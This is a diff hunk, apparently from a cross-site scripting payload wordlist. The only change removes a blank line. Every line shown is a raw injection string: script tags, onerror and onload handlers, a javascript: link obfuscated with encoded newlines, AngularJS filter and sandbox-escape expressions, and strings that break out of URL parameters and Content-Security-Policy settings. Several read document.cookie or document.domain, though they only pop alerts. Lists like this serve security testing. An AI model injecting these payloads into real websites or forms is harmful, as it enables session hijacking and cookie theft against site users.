@@ -40,7 +40,6 @@ ${alert(1)}
 <input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x';
 <script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
 "><img src=xx onerror=alert(document.domain)>
-
 <a+href="ja%0A%0Dvascript:alert(document.domain)">Click</a>
 {{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+'; astNode.argument={type:'Identifier',name:'foo'}; "); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }}
 <script>alert(document.cookie)</script> </textarea><script>alert(/xss/)</script> &text=awdawdawd%27%3balert%28%22xss%22%29%3b%2f%2f &text=file-sharing/universities&page="><script>alert('XSS')</script></title><svg/onload=alert(document.cookie)>
